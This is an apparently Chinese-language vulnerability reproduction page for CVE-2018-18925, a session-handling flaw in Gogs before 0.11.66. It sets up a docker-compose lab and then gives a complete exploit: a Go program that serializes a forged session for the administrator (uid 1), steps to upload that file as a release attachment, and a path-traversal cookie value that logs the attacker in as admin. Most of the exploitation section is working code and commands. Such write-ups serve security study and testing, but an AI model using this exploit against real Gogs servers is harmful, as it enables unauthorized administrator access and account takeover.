<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cve-2018-18925gogs-任意用户登录漏洞"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2018-18925</span><span class="csECDA2D3">）</span><span class="csDE05BCC">Gogs </span><span class="csECDA2D3">任意用户登录漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">gogs</span><span class="cs9C1B1871">是一款极易搭建的自助</span><span class="cs8926E06">Git</span><span class="cs9C1B1871">服务平台，具有易安装、跨平台、轻量级等特点，使用者众多。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">其</span><span class="cs8926E06">0.11.66</span><span class="cs9C1B1871">及以前版本中，（</span><span class="cs8926E06">go-macaron/session</span><span class="cs9C1B1871">库）没有对</span><span class="cs8926E06">sessionid</span><span class="cs9C1B1871">进行校验，攻击者利用恶意</span><span class="cs8926E06">sessionid</span><span class="cs9C1B1871">即可读取任意文件，通过控制文件内容来控制</span><span class="cs8926E06">session</span><span class="cs9C1B1871">内容，进而登录任意账户。</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Gogs &lt; 0.11.66</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">执行如下命令启动</span><span class="cs8926E06">gogs</span><span class="cs9C1B1871">：</span></p><p class="cs3A447A38"><span class="cs9FB05234">docker-compose up -d</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">环境启动后，访问</span><span class="cs9FB05234">http://your-ip:3000</span><span class="cs9C1B1871">，即可看到安装页面。安装时选择</span><span class="cs8926E06">sqlite</span><span class="cs9C1B1871">数据库，并开启注册功能。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">安装完成后，需要重启服务：</span><span class="cs9FB05234">docker-compose restart</span><span class="cs9C1B1871">，否则</span><span class="cs8926E06">session</span><span class="cs9C1B1871">是存储在内存中的。</span></p><h2 class="cs868C439D">
			<a name="漏洞利用"><span class="cs83F14626">漏洞利用</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">使用</span><span class="cs8926E06">Gob</span><span class="cs9C1B1871">序列化生成</span><span class="cs8926E06">session</span><span class="cs9C1B1871">文件：</span></p><p class="cs3A447A38"><span class="cs9FB05234">package main</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">import (</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;bytes&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;encoding/gob&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;encoding/hex&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;fmt&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;io/ioutil&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;os&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">func EncodeGob(obj map[interface{}]interface{}) ([]byte, error) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;for _, v := range obj {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;gob.Register(v)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;buf := bytes.NewBuffer(nil)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;err := gob.NewEncoder(buf).Encode(obj)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return buf.Bytes(), err</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">func main() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;var uid int64 = 1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;obj := map[interface{}]interface{}{&quot;_old_uid&quot;: &quot;1&quot;, &quot;uid&quot;: uid, &quot;uname&quot;: &quot;root&quot;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;data, err := EncodeGob(obj)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if err != nil {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fmt.Println(err)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;err = ioutil.WriteFile(&quot;data&quot;, data, os.O_CREATE|os.O_WRONLY)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if err != nil {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fmt.Println(err)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;edata := hex.EncodeToString(data)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fmt.Println(edata)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后注册一个普通用户账户，创建项目，并在</span><span class="cs8926E06">&ldquo;</span><span class="cs9C1B1871">版本发布</span><span class="cs8926E06">&rdquo;</span><span class="cs9C1B1871">页面上传刚生成的</span><span class="cs8926E06">session</span><span class="cs9C1B1871">文件：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Gogs/%ef%bc%88CVE-2018-18925%ef%bc%89Gogs%20%e4%bb%bb%e6%84%8f%e7%94%a8%e6%88%b7%e7%99%bb%e5%bd%95%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="329" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">通过这个附件的</span><span class="cs8926E06">URL</span><span class="cs9C1B1871">，得知这个文件的文件名：</span><span class="cs9FB05234">./attachments/2eb7f1a2-b5ec-482e-a297-15b625d24a10</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后，构造</span><span class="cs8926E06">Cookie</span><span class="cs9C1B1871">：</span><span class="cs9FB05234">i_like_gogits=../attachments/2/e/2eb7f1a2-b5ec-482e-a297-15b625d24a10</span><span class="cs9C1B1871">，访问即可发现已经成功登录</span><span class="cs8926E06">id=1</span><span class="cs9C1B1871">的用户（即管理员）：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Gogs/%ef%bc%88CVE-2018-18925%ef%bc%89Gogs%20%e4%bb%bb%e6%84%8f%e7%94%a8%e6%88%b7%e7%99%bb%e5%bd%95%e6%bc%8f%e6%b4%9e_files/image1.png" width="560" height="295" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">完整的利用过程与原理，可以阅读参考链接中的文章。</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://vulhub.org/#/environments/gogs/CVE-2018-18925/</span></p></body>
</html>
